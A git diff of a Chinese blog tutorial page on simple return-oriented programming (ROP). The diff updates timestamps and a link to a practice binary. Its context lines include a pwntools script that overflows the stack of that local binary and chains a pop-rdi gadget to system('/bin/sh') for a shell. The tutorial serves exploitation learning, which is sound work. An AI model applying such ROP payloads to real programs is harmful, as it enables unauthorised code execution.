@@ -120,7 +120,7 @@
 <meta property="og:image" content="https://charlieleex.github.io/2018/07/29/pwn从入门到放弃第六章——简单ROP/t3.png">
 <meta property="og:image" content="https://charlieleex.github.io/2018/07/29/pwn从入门到放弃第六章——简单ROP/t4.png">
 <meta property="og:image" content="https://charlieleex.github.io/2018/07/29/pwn从入门到放弃第六章——简单ROP/t5.png">
-<meta property="og:updated_time" content="2018-09-16T06:19:10.431Z">
+<meta property="og:updated_time" content="2018-09-16T06:20:28.135Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwn从入门到放弃第六章——简单ROP">
 <meta name="twitter:description" content="这篇鸽了挺久的，补一下吧 简单介绍ROP首先先来说下什么是ROP ROP是Return Oriented Programming  的缩写翻译过来就是面向返回的编程 你可能会问，我们不是利用栈溢出漏洞么，怎么又扯到编程了？ 其实ROP就是另外一种意义上的编程，其核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件  程序存在溢出，并且可以控制返回地址。">
@@ -345,7 +345,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-09-16 14:19:10" itemprop="dateModified" datetime="2018-09-16T14:19:10+08:00">2018-09-16</time>
+                <time title="Modified: 2018-09-16 14:20:28" itemprop="dateModified" datetime="2018-09-16T14:20:28+08:00">2018-09-16</time>
               
             
           </span>
@@ -462,7 +462,7 @@
 <p>这里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop3ret</span><br></pre></td></tr></table></figure></p>
 <p>作用是改变栈，让栈指针指向system</p>
 <h3 id="64位程序实战"><a href="#64位程序实战" class="headerlink" title="64位程序实战"></a>64位程序实战</h3><p>64位的其实和32位的大同小异，区别就在于传递参数那里</p>
-<p>这里给下<a href="">示例程序</a></p>
+<p>这里给下<a href="https://github.com/Ch4r1l3/Ch4r1l3.github.io/blob/master/2018/07/29/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E5%85%AD%E7%AB%A0%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95ROP/pwn_level1_64" target="_blank" rel="noopener">示例程序</a></p>
 <p>然后给下payload，因为差不多，所以就不详细解释了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&apos;./pwn_level1_64&apos;)</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;try to stackoverflow!!&apos;)</span><br><span class="line"></span><br><span class="line">prdi=0x400663</span><br><span class="line">binsh=0x400684</span><br><span class="line">system=0x400480</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*9+p64(prdi)+p64(binsh)+p64(system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>但是因为程序没有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rdx</span><br></pre></td></tr></table></figure></p>
